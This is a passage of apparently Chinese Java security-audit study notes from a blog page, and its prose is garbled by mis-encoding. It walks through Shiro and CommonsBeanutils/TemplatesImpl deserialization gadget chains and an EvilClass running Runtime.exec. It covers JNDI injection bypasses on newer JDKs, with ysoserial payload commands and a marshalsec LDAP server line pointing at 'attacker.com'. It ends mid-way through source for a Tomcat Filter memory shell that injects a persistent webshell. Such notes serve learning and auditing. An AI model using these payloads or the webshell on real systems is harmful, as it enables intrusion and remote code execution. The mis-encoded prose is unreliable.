</p><ul><li><p>fastjsonåˆ©ç”¨æ–¹æ³•ï¼šè°ƒç”¨JdbcRowSetImplç±»ï¼Œé€šè¿‡setï¼Œgetæ–¹æ³•è§¦å‘lookupæ–¹æ³•ä¼ å‚(ååºåˆ—åŒ–è‡ªå®šä¹‰æ–¹æ³•)ï¼Œè¿œç¨‹è°ƒç”¨è„šæœ¬</p></li><li><p>shiroååºåˆ—åŒ–ï¼šåˆ©ç”¨åŸç”Ÿååºåˆ—åŒ–å‡½æ•°ï¼šreadObject  writeObject  ObjectInputStream(æ¼æ´ç‚¹)</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A139.png"></p></li><li><p>shiroå¯èƒ½æœ‰JdbcRowSetImplç±»ï¼Œä¸æ»¡è¶³è§¦å‘setï¼Œgetæ¡ä»¶</p></li></ul></li></ul></li><li><p>åˆ©ç”¨å·¥å…·ä½¿ç”¨åˆ©ç”¨é“¾æ‰§è¡Œå‘½ä»¤ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A140.png"></p></li></ul><h4 id="ccåˆ©ç”¨é“¾åˆ†æ"><a href="#ccåˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="ccåˆ©ç”¨é“¾åˆ†æ"></a>ccåˆ©ç”¨é“¾åˆ†æ</h4><ul><li><p>CCé“¾ï¼Œå…¨ç§°ä¸ºCommonsCollectionsé“¾ï¼Œæ˜¯æŒ‡åœ¨Javaååºåˆ—åŒ–æ¼æ´ä¸­åˆ©ç”¨Apache Commons Collectionsåº“ä¸­çš„ç‰¹å®šç±»å’Œæ–¹æ³•ï¼Œæ„é€ å‡ºä¸€æ¡å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç çš„è°ƒç”¨é“¾ã€‚CCé“¾çš„æ ¸å¿ƒåœ¨äºåˆ©ç”¨åå°„æœºåˆ¶ï¼Œé€šè¿‡ä¸€ç³»åˆ—çš„ç±»å’Œæ–¹æ³•è°ƒç”¨ï¼Œæœ€ç»ˆè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ã€‚</p></li><li><p>æ”»å‡»é“¾çš„é€‰å–ä¸æ¡†æ¶åŠ è½½çš„å¤–éƒ¨åº“æœ‰å…³ï¼Œå¤–éƒ¨åº“ä¸­å­˜åœ¨åŸç”Ÿçš„æ¼æ´</p></li><li><p>CBé“¾åˆ†æï¼š<a href="https://www.freebuf.com/articles/web/319397.html">å…³äºæˆ‘å­¦æ¸—é€çš„é‚£æ¡£å­äº‹ä¹‹Javaååºåˆ—åŒ–-CBé“¾ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></li><li><p>çŸ¥è¯†è¦ç‚¹</p><ul><li><p>å…¥å£ç‚¹ï¼šè§¦å‘ååºåˆ—åŒ–çš„é‡å†™readObjectæ–¹æ³•</p></li><li><p>getProperty()æ–¹æ³•</p><p>CBé‡Œé¢çš„ç±»æ–¹æ³•  å¯¹å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•è¿›è¡Œè°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PropertyUtils.getProperty(new Person(),&quot;name&quot;);</span><br><span class="hljs-comment">//è‡ªåŠ¨è°ƒç”¨Personå¯¹è±¡é‡Œé¢çš„getNameæ–¹æ³•</span><br>PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>(),<span class="hljs-string">&quot;outputProperties&quot;</span>)<br><span class="hljs-comment">//è‡ªåŠ¨è°ƒç”¨TemplatesImplå¯¹è±¡é‡Œé¢çš„getOutputPropertiesæ–¹æ³•</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>æ¼æ´å¤ç°åŠCBé“¾åˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å°†åˆ©ç”¨é“¾åˆ†ä¸ºä¸‰éƒ¨åˆ†</span><br><br>TemplatesImptç±»-&gt;è°ƒç”¨æ¶æ„ç±»<br><br>BeanComparatorç±»-&gt;åˆ©ç”¨javabeanè°ƒç”¨getOutputProperties()<br><br>PriorityQueueç±»-&gt;åå°„è°ƒç”¨PropertyUtils.getPropert<br></code></pre></td></tr></table></figure><ul><li><p>å…¥å£ç‚¹</p><p>PriorityQueue #readObject -&gt; heapify() -&gt; siftDown -&gt; siftDownUsingComparator -&gt; comparator.compare</p><p>-&gt; BeanComparator.compare</p><p>BeanComparator.compareä¼šæ‰§è¡ŒPropertyUtils.getProperty</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o1, <span class="hljs-built_in">this</span>.property);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o2, <span class="hljs-built_in">this</span>.property);<br><br>o1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>()<br>property=outputProperties<br>ä¼šè‡ªåŠ¨è°ƒç”¨TemplatesImpl#getOutputPropertiesæ–¹æ³•<br></code></pre></td></tr></table></figure><p>æ¡ä»¶</p><ul><li>size &gt;&#x3D;2</li><li>comparator !&#x3D; null</li><li>property  !&#x3D;  null</li></ul><p>TemplatesImpl é“¾ï¼Œå±äºCCé“¾åˆ†æ  RCE</p><p>-&gt;  TemplatesImpl #getOutputProperties</p><p>-&gt;  newTransformer()</p><p>-&gt;  TransformerImpl(getTransletInstance())</p><p>-&gt;  defineTransletClasses()</p><p>-&gt;  loader.defineClass(æ‰§è¡Œå‘½ä»¤)</p><p>æ¡ä»¶ï¼š</p><p>_name !&#x3D;null</p><p>_class   !&#x3D;null</p><p>_bytecodes !&#x3D; null (å‘½ä»¤å‚æ•°)</p></li></ul></li><li><p>loader.defineClass</p><p><code>ClassLoader.defineClass</code> æ˜¯ <code>ClassLoader</code> çš„ä¸€ä¸ªå—ä¿æŠ¤æ–¹æ³•ï¼Œå®ƒå…è®¸å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º Java ç±»ã€‚æ”»å‡»è€…å¯å€ŸåŠ©å®ƒåŠ è½½ä»»æ„æ¶æ„ç±»ï¼ˆå³â€œå†…å­˜é©¬â€æˆ–åŒ…å«å‘½ä»¤æ‰§è¡Œçš„ç±»ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = loader.defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œ<code>classBytes</code> ä¸­çš„å­—èŠ‚ç å°±ä¼šè¢«å®šä¹‰ä¸ºç±»å¹¶åŠ è½½è¿› JVMï¼Œéšä¹‹å¯èƒ½æ‰§è¡Œé™æ€ä»£ç å—æˆ–æ„é€ æ–¹æ³•ä¸­æºå¸¦çš„æ¶æ„é€»è¾‘ã€‚</p><p><code>defineClass</code> æœ¬èº«ä¸æ‰§è¡Œå‘½ä»¤ï¼Œå®ƒåªæ˜¯<strong>å°†å­—èŠ‚ç åŠ è½½ä¸ºç±»</strong>ã€‚çœŸæ­£æ‰§è¡Œå‘½ä»¤çš„è¡Œä¸ºï¼Œé€šå¸¸å‘ç”Ÿåœ¨ï¼š</p><ul><li>ç±»çš„<strong>é™æ€ä»£ç å—</strong>ï¼›</li><li>ç±»çš„<strong>æ„é€ æ–¹æ³•</strong>ï¼›</li><li>ç±»çš„æ–¹æ³•ä¸­ï¼Œè¢«éšåç«‹å³è°ƒç”¨ã€‚</li></ul><p>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€æ—¦è¢«åŠ è½½ï¼ˆé€šè¿‡ <code>defineClass</code>ï¼‰ï¼Œè¿™ä¸ªç±»çš„é™æ€ä»£ç å—å°±ä¼šç«‹å³æ‰§è¡Œï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚</p></li><li><p>ååºåˆ—åŒ–ç®€åŒ–æµç¨‹å›¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ååºåˆ—åŒ–å…¥å£<br>     â†“<br>CCåˆ©ç”¨é“¾è§¦å‘ï¼ˆTemplatesImplã€InvokerTransformer ç­‰ï¼‰<br>     â†“<br>è°ƒç”¨ defineClass(classBytes)<br>     â†“<br>åŠ è½½æ¶æ„ç±»<br>     â†“<br>é™æ€å—/æ„é€ å™¨æ‰§è¡Œ<br>     â†“<br>å‘½ä»¤æ‰§è¡Œï¼ˆå¦‚ Runtime.getRuntime().<span class="hljs-built_in">exec</span>ï¼‰<br></code></pre></td></tr></table></figure></li><li><p>ååºåˆ—åŒ–æ„é€ ccé“¾èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„æ ¸å¿ƒ</p><ol><li><code>TemplatesImpl.getOutputProperties()</code> ä¼šè§¦å‘å†…éƒ¨ <code>defineTransletClasses()</code>ï¼›</li><li>è¿™ä¸ªæ–¹æ³•è°ƒç”¨äº† <code>defineClass()</code>ï¼ŒåŠ è½½äº†æˆ‘ä»¬æ³¨å…¥çš„æ¶æ„ç±»ï¼›</li><li>æ¶æ„ç±»çš„ <strong>é™æ€ä»£ç å—</strong> è¢«ç«‹å³æ‰§è¡Œ â†’ <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>ï¼›</li></ol></li></ul><h3 id="JNDIæ³¨å…¥åŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡"><a href="#JNDIæ³¨å…¥åŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡" class="headerlink" title="JNDIæ³¨å…¥åŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡"></a>JNDIæ³¨å…¥åŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡</h3><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">æ¢ç´¢é«˜ç‰ˆæœ¬ JDK ä¸‹ JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³• - è·³è·³ç³– (tttang.com)</a></p><ul><li><p>JNDIæ³¨å…¥è§¦å‘çš„ä¸‰ä¸ªæ¨¡å¼</p><ol><li>è¿œç¨‹å¼•ç”¨æ¨¡å¼(åŸºäºJDKç‰ˆæœ¬)</li><li>æœ¬åœ°å¼•ç”¨æ¨¡å¼(åŸºäºä¾èµ–Jar)</li><li>ååºåˆ—åŒ–æ¨¡å¼(åŸºäºgadgeté“¾)</li></ol></li><li><p>jndiæ³¨å…¥çš„ç‰ˆæœ¬é™åˆ¶</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A141.png"></p><p>é«˜ç‰ˆæœ¬æ— æ³•æ³¨å…¥çš„åŸå› ï¼š</p><ul><li><p>com.sun.jndi.rmi.object.trustURLCodebaseï¼Œ</p><p>com.sun.jndi.cosnaming.object.trustURLCodebaseçš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ï¼Œæ²¡é™åˆ¶åŠ è½½æœ¬åœ°æ–‡ä»¶</p></li></ul></li><li><p>é«˜ç‰ˆæœ¬ç»•è¿‡æ–¹æ³•</p><ul><li><p>åˆ©ç”¨jaråŒ…</p><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">æ¢ç´¢é«˜ç‰ˆæœ¬ JDK ä¸‹ JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³• - è·³è·³ç³– (tttang.com)</a></p><p>ç™½ç›’å®¡è®¡æ—¶æŸ¥çœ‹å¼•å…¥äº†ä»€ä¹ˆä¾èµ–ï¼Œæ ¹æ®å¼•å…¥çš„ä¾èµ–åˆ©ç”¨æœ¬åœ°jaråŒ…ï¼Œè¿›è¡Œjndiæ³¨å…¥</p></li><li><p>åˆ©ç”¨ååºåˆ—åŒ–é“¾(åŒæ ·éœ€è¦ä¾èµ–åŒ…)</p><p><a href="https://blog.csdn.net/mole_exp/article/details/121141042">JNDIæ³¨å…¥åˆ©ç”¨åŸç†åŠç»•è¿‡é«˜ç‰ˆæœ¬JDKé™åˆ¶_jndiæ³¨å…¥çš„é™åˆ¶-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html#3-%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce">javaé«˜ç‰ˆæœ¬ä¸‹å„ç§JNDI Bypassæ–¹æ³•å¤ç° - bitterz - åšå®¢å›­ (cnblogs.com)</a></p><p>åŸç†ï¼š</p><p>å³ä½¿ï¼š</p><ul><li>è¿œç¨‹ç±»åŠ è½½è¢«ç¦ç”¨äº†ï¼ˆç¦æ­¢ <code>http://...</code> ç±»åŠ è½½ï¼‰</li><li><code>trustURLCodebase=false</code></li></ul><p>åªè¦ <strong>Java ä¼šå°è¯•è¯»å–å¯¹è±¡å¹¶ååºåˆ—åŒ–</strong>ï¼ˆå¦‚é€šè¿‡ <code>ObjectInputStream</code>ï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨è¿”å›ä¸­åµŒå…¥<strong>åºåˆ—åŒ– Gadget é“¾å¯¹è±¡</strong>ï¼Œå¹¶åœ¨ç›®æ ‡ä¸­æ¿€æ´»å®ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="hljs-string">&quot;calc&quot;</span> &gt; poc.txt<br><span class="hljs-built_in">cat</span> poc.txt|base64.txt(æ›¿æ¢æ¢è¡Œç¬¦)<br>ldap://127.0.0.1:6666/exp<br><br><span class="hljs-comment">#éœ€è¦ä¾èµ–åŒ…</span><br>&lt;groupId&gt;commoms-collections&lt;/groupId&gt;<br>&lt;artifactId&gt;commons-conllections&lt;/artfactId&gt;<br></code></pre></td></tr></table></figure><p>åœ¨ Java 8u191+ ç­‰é«˜ç‰ˆæœ¬ä¸­ï¼Œè™½ç„¶è¿œç¨‹ç±»åŠ è½½è¢«ç¦ç”¨äº†ï¼ˆ<code>trustURLCodebase=false</code>ï¼‰ï¼Œ<strong>ä½†å¦‚æœç›®æ ‡ç³»ç»Ÿä¸­å·²ç»å­˜åœ¨å¯ç”¨çš„ Gadget é“¾ï¼ˆåˆ©ç”¨é“¾ï¼‰ç±»ï¼Œå°±å¯èƒ½é€šè¿‡ JNDI æ³¨å…¥è§¦å‘ååºåˆ—åŒ–ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤</strong>ã€‚</p><p> ç»•è¿‡æ€è·¯ï¼šåˆ©ç”¨å·²æœ‰ Gadget é“¾</p><p> æ¡ä»¶</p><ol><li><strong>JNDI æ³¨å…¥ç‚¹å­˜åœ¨</strong>ï¼ˆå¦‚ Log4jã€Tomcat é…ç½®ç­‰ï¼‰</li><li><strong>ç›®æ ‡æœåŠ¡å™¨å·²æœ‰å¯åˆ©ç”¨çš„ç±»</strong>ï¼ˆå¦‚ commons-collectionsã€Groovyã€Spring ç»„ä»¶ç­‰ï¼‰</li><li><strong>æ”¯æŒ LDAP æˆ– RMI ç»‘å®š Object å®ä¾‹</strong>ï¼ˆä¸æ˜¯è¿œç¨‹ç±»åŠ è½½ï¼Œè€Œæ˜¯å¯¹è±¡ååºåˆ—åŒ–ï¼‰</li></ol><p>ç»•è¿‡æ–¹å¼æŠ€æœ¯ç»†èŠ‚</p><p>1.ä½¿ç”¨ LDAP æœåŠ¡è¿”å› <strong>åºåˆ—åŒ–å¯¹è±¡ï¼ˆä¸æ˜¯ç±»å¼•ç”¨ï¼‰</strong></p><p>æ”»å‡»è€…æ­å»ºæ¶æ„ LDAP æœåŠ¡å™¨ï¼Œå½“ç›®æ ‡å‘èµ· JNDI æŸ¥è¯¢æ—¶ï¼Œè¿”å›ä¸€ä¸ªå·²ç»æ„é€ å¥½çš„ Java åºåˆ—åŒ–å¯¹è±¡ï¼ˆObjectï¼‰ï¼Œè€Œä¸æ˜¯è¿œç¨‹ç±»çš„ URLã€‚</p><p> <strong>å³ä¸éœ€è¦ trustURLCodebase &#x3D; true</strong>ï¼Œè€Œæ˜¯åˆ©ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference â†’ Referenceable â†’ ç‰¹å®š Gadget é“¾çš„åºåˆ—åŒ–å¯¹è±¡<br></code></pre></td></tr></table></figure><ol start="2"><li>æ„é€  Gadget é“¾ï¼ˆåˆ©ç”¨ ysoserial å·¥å…·ï¼‰</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;calc&#x27;</span> &gt; payload.ser<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>marshalsec</code> é¡¹ç›®ä¸­çš„ LDAPServer æ¨¡æ‹Ÿ LDAP æœåŠ¡ï¼Œè¿”å›è¿™ä¸ªå¯¹è±¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://attacker.com/#Exploit&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h3><ul><li><p>webä»£ç æ‰§è¡Œæµç¨‹</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A142.png"></p></li><li><p>servletå±‚è§¦å‘çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æœ‰è¯·æ±‚å¿…è§¦å‘çš„æ–¹æ³•</span><br>requestInitialized<br>requestDestroyed    <br></code></pre></td></tr></table></figure></li><li><p>å†…å­˜é©¬çš„ç±»å‹</p><ol><li>Listenerå†…å­˜é©¬ï¼šç›‘å¬ç‰¹å®šäº‹ä»¶å¹¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li>Filterå†…å­˜é©¬ï¼šæ‹¦æˆªå’Œä¿®æ”¹HTTPè¯·æ±‚å’Œå“åº”ã€‚</li><li>Servletå†…å­˜é©¬ï¼šç›´æ¥å¤„ç†HTTPè¯·æ±‚å¹¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚</li></ol><p><img src="https://image.3001.net/images/20221209/1670591008_63933220d0b7298b0fb3f.png!small"></p></li></ul><h4 id="Listenä¸­å†…å­˜é©¬"><a href="#Listenä¸­å†…å­˜é©¬" class="headerlink" title="Listenä¸­å†…å­˜é©¬"></a>Listenä¸­å†…å­˜é©¬</h4><ul><li><p>åŸç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">ç›‘å¬å™¨æŒ‡å‘class: com.example.listenshell.Test<br><br>applicationListeners=com.example.listenshell.Test<br>StanderContext#contxet-&gt;ApplicationContext#context<br><br>é¡¹ç›®å¯åŠ¨ listenåœ¨è¿è¡Œæ—¶  classæ¥æºæ˜¯æ€ä¹ˆè·å–çš„<br>StandardContext#addApplicationEventListener<br>å†…å­˜:æ·»åŠ ä¸€ä¸ªlisten <br><br>Servlet -&gt; ApplicationContext -&gt; StandardContext<br></code></pre></td></tr></table></figure></li></ul><h4 id="Filterä¸­å†…å­˜é©¬"><a href="#Filterä¸­å†…å­˜é©¬" class="headerlink" title="Filterä¸­å†…å­˜é©¬"></a>Filterä¸­å†…å­˜é©¬</h4><ul><li><p>filterç±»ä¸­çš„æ–¹æ³•</p><ul><li>initâ€“åˆå§‹åŒ–</li><li>doFilter â€“ æ‰§è¡Œç‚¹</li><li>destory â€“  é”€æ¯</li></ul></li><li><p>filterè®¿é—®æµç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Servlet -&gt; context-&gt;ApplicationFilterConfig-&gt;context-&gt;StandardContext-&gt;filterConfigs<br><br>ApplicationFilterConfig#filterConfig context -&gt; StandardContext#<br><br>filterConfigs<br>filterDefs#  é…ç½®åç§°å’Œclass<br>filterMaps   é…ç½®åç§°urlè·¯ç”±<br><br>ApplicationFilterConfig#filterConfig( filterDef(filterClass filterName))<br><br>addFilterDef  æ·»åŠ é…ç½®åç§°å’Œclass<br>addFilterMap  addFilterMapBefore  æ·»åŠ é…ç½®åç§°å’Œurlè·¯ç”±<br></code></pre></td></tr></table></figure></li><li><p>å†…å­˜é©¬å®ç°</p><p>â€“ ç›¸å½“äºæ·»åŠ ä¸€ä¸ªFilter</p><ol><li>Servletè·å–ç”¨æˆ·è®¿é—®</li><li>åˆ¤æ–­è§¦å‘(æ˜¯å¦ä¸ºnull)</li><li>å¦‚æœªè§¦å‘åˆ™æ·»åŠ Filter</li><li>å‘å¯¹è±¡æˆå‘˜ä¸­æ·»åŠ é…ç½®ä¿¡æ¯</li></ol></li><li><p>Filterå†…å­˜é©¬ç¼–å†™</p><p><a href="https://zhuanlan.zhihu.com/p/404057893">ã€å®‰å…¨è®°å½•ã€‘é€šè¿‡jspæ–‡ä»¶æ³¨å…¥å†…å­˜é©¬ - çŸ¥ä¹ (zhihu.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> pres.test.momenshell;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddTomcatFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.doPost(req, resp);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;RoboTerh&quot;</span>;<br>            <span class="hljs-comment">//ä»requestä¸­è·å–ServletContext</span><br>            <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> req.getSession().getServletContext();<br><br>            <span class="hljs-comment">//ä»contextä¸­è·å–ApplicationContextå¯¹è±¡</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>            <span 